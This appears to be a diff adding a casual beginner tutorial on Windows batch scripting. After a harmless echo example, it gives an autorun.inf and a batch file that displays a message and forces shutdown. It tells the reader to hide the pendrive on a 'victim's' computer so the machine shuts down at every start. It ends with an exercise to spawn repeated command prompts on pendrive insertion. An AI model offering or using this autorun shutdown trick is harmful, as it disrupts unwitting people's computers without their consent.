@@ -1,0 +1,55 @@
+Batch files ?
+
+Its a text file which contains set of commands for the computer in sequence.Simply put , It is a way of telling a computer to do something for you one afeter the other in a sequence.
+This is like writing a script to an actor to act according to the script.Hence, the name batch scripting.This is applied for DOS(i.e,windows).If you are using linux .
+you will come across shell scripting.Same as batch scripting but with a little different idea.
+This example should give you clear idea about the concept.Open a text editor type the following.
+
+@echo off
+echo this is a batch scripting
+pause
+
+Save it as yourwish.bat remember .bat is the key . save the file on your computer.Double click on the file.
+amazing isn't it?
+here's what's going on here.
+you are telling the computer to say "this is a batch scripting" to you.Now , donot underestimate capabilities of batch scripting.
+If you are having the mentality of a hacker you know what i mean. you can automate anything on a computer.Echo off prevents the user from seeing the commands from command prompt.we use @ because without it everything after echo off turns invisible but echo off would still be visible.Using @ prevents that from happening.
+In this tutorial we are going to run a batch file from a pendrive.cooool.
+
+open a text editor and type
+
+[autorun]
+open=somename.bat
+Icon=anything.ico
+
+and save the file as autorun.inf
+
+Now open text editor again to create somename.bat and type
+
+@echo off
+
+msg*some message that you want
+shutdown -c"error! your message comes here" -s
+
+save it as somename.bat remember to give it a .bat extension
+now take a pendrive copy both files before that backup all your data and format the pendrive.
+
+Now,stick that pendrive in place where your victim cannot see.That is back of a cpu there's a usb port just for this purpose(just joking the purpose of that usb port is to have a pendrive)
+Once you finished the process of sticking a pendrive.Once the pendrive is loaded it will show a message and it will shut down.If the victim tries to switch on his computer again it will again show that same message
+and will shutdown the computer again.The process continues until the pendrive is removed.
+
+What is happening in this exploit or hack is .When your pendrive was connected to the cpu the pendrive was loaded. The cpu enters the pendrive and see its contents and notices a autorun file. and starts executing that file
+and that file says to the cpu to run the batch file which has the command to shut down the computer with some message.Easy peasy isnt it?
+remember each time when you turn on the computer it has to load a lot of stuff and the it has to load external devices(i.e, your pendrive)
+
+
+food for Hack !!!!
+
+Write batch script which opens a command prompt on connecting a pendrive . Remember it should open comand prompt 5 times.
+Can you do it?
+
+cons of using a batch file :
+
+-> It can be easily opened by a text editor.
+-> Most of the times the antivirus looks for suspicious batch files and prevents it from executing
+-> It is applied on a victim who has minimal knowledge on computers.
